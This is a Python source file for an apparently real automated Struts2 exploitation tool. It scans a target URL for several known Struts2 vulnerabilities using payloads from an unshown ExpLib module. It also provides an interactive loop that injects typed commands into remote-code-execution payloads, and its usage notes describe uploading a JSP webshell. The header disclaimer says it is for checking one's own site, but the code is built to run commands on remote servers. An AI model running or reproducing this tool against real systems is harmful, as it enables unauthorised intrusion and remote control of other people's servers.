'''
Made By 苍冥
Belongs to WindPunish Team

Declearation:
	This script is to examine the Struts2 vulnerability of YOUR SITE,
	I will not take responsibility for the abuse of this script.
	If you misuse it, then that's your problem.

This script is still in development...

RushSt2.py -u www.abcdefg.com/login.action
RushSt2.py -f url_list.txt
RushSt2.py -u www.abcdefg.com/login.action -e S2-016
RushSt2.py -u www.abcdefg.com/login.action --upload C:/webshell.jsp
RushSt2.py -u www.abcdefg.com/login.action -e s2-016 --cmd-shell
'''
import requests
from ExpLib import ExpList
import argparse

#Init Global Variables
AvailableEXP = []
TargetURL = ""
ExpVersion = ""
HTTPMethod = ""
AttackVector = ""

def initAvailableExp():
	for exp in ExpList:
		AvailableEXP.append(exp.upper())

def PoC_GET(TargetURL, ExpVersion):
	response = requests.get(TargetURL+ExpList[ExpVersion]["PoC"], timeout = 30).content.decode("utf-8").strip()
	return response

def PoC_POST(TargetURL, ExpVersion):
	pass

def PoC_Sniper(TargetURL, ExpVersion, HTTPMethod):
	#Sniper single St2 Vulnerability
	print("Testing %s ..." %(ExpVersion))
	if HTTPMethod == "GET":
		return PoC_GET(TargetURL, ExpVersion)
	else:
		return PoC_POST(TargetURL, ExpVersion)

def PoC_Scan_All(TargetURL, HTTPMethod):
	#Scan for All St2 Vulnerabilities
	ExpResultDict = {}
	for exp in ExpList:
		ExpResultDict[exp] = len(PoC_Sniper(TargetURL, exp, HTTPMethod))
	print("\n")
	return ExpResultDict

def exploit(TargetURL, ExpVersion, HTTPMethod):
	if ExpVersion == "ALL":
		#PoC Scan for all vulnerabilities
		ExpResultDict = PoC_Scan_All(TargetURL, HTTPMethod)
		for Exp in ExpResultDict:
			print("%s : %s" %(Exp, ExpResultDict[Exp]))
	else:
		#Pre-defined exploit
		print(PoC_Sniper(TargetURL, ExpVersion, HTTPMethod))



def CommandExecute(TargetURL, ExpVersion, Command):
	payload = ExpList[ExpVersion]["CMD"].replace("***CMD***", Command)
	result = requests.get(TargetURL+payload, timeout = 30).content.decode("utf-8").strip()
	#Make the result clean by removing non-ASCII characters
	return result.rstrip(' \t\r\n\0')


#Initialise Exploit Database
initAvailableExp()

if __name__ == "__main__":
        parser = argparse.ArgumentParser(description="Automated Struts2 Exploit Set")
        parser.add_argument("-u","--url", help="Target Vulnerable URL", required=True)
        parser.add_argument("-e","--exploit", help= "Exploit Version Choice ( default: Scan for all ) Version: S2-016  S2-019  S2-032  S2-033  S2-DEVMODE")
        parser.add_argument("-m","--method", help="HTTP Method: [GET / POST] ( default: GET )")
        parser.add_argument("--file-upload", help="File Upload")
        parser.add_argument("--cmd-shell", help="Bounces back a command shell", action='store_true')
        args = vars(parser.parse_args())

	#--URL: Add protocol prefix
        if "http://" not in args["url"] and "https://" not in args["url"]:
                TargetURL = "http://" + args["url"]
        else:
                TargetURL = args["url"]
         #Check if argument "Method" has been set, defaults to GET Method
        if args["method"] == None or args["method"] == "GET":
                HTTPMethod = "GET"
        elif args["method"].upper() == "POST":
                HTTPMethod = "POST"
        else:
                print("HTTP Method not Supported. Use GET or POST")
                exit()

	#--EXPLOIT
        if args["exploit"] == None:
		#If the Exploit option is not set
                ExpVersion = "ALL"
        elif args["exploit"].upper() in AvailableEXP:
                ExpVersion = args["exploit"].upper()
        else:
                print("Exploit not found in database!")
                exit()

	#--CMD-SHELL
        if args["cmd_shell"] == True:
                #Check if there exists a specific exploit, i.e. if the exploit has been set by user
                if ExpVersion != "ALL" and ExpVersion != "":
                        command = ""
                        while True:
                                command = input("\n->")
                                if command.upper() == "EXIT" or command.upper() == "QUIT":
                                        break
                                else:
                                        print(CommandExecute(TargetURL, ExpVersion, command))

                else:
                        print("Please set a specific exploit version before using command shell.")
        else:
		#If --cmd-shell flag is set, don't need to go through the scanning process
                print("\nAll Set:\n\tTarget URL:\t%s\n\tHTTP Method:\t%s\n\tExploit:\t%s\n\n" %(TargetURL,HTTPMethod,ExpVersion))
                exploit(TargetURL, ExpVersion, HTTPMethod)
                print("\n"*2)

